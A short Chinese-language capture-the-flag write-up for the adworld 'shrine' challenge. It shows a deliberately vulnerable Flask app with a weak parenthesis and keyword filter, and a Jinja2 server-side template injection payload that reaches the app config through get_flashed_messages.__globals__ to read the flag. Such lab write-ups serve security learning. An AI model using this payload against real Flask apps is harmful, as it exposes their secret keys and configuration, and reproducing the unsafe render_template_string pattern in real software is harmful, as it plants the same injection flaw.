### shrine-adworld

还以为是别的什么框架问题，又是flask的ssti

![image-20240919123954071](C:\Users\10649\AppData\Roaming\Typora\typora-user-images\image-20240919123954071.png)

```python
import flask
import os

app = flask.Flask(__name__)
app.config['FLAG'] = os.environ.pop('FLAG')

@app.route('/')
def index():
    return open(__file__).read()

@app.route('/shrine/')
def shrine(shrine):
    def safe_jinja(s):
        # 将左括号和右括号替换为空
        s = s.replace('(', '').replace(')', '')
        
        # 黑名单中的关键词被禁止使用
        blacklist = ['config', 'self']
        
        # 构建 Jinja 模板，设置黑名单中的变量为 None
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s

    # 渲染模板，传入处理过的 shrine 参数
    return flask.render_template_string(safe_jinja(shrine))

if __name__ == '__main__':
    app.run(debug=True)

```

看到jinja和flask，直接在/shrine/下ssti打

![image-20240919123314468](C:\Users\10649\AppData\Roaming\Typora\typora-user-images\image-20240919123314468.png)

这里直接用昨天现用的，因为flag在config里，就不用构造eval去看rce

###

如果过滤了config,又需要查config

###

```
{{config}}
{{get_flashed_messages.__globals__['current_app'].config}}
```

![image-20240919124137073](C:\Users\10649\AppData\Roaming\Typora\typora-user-images\image-20240919124137073.png)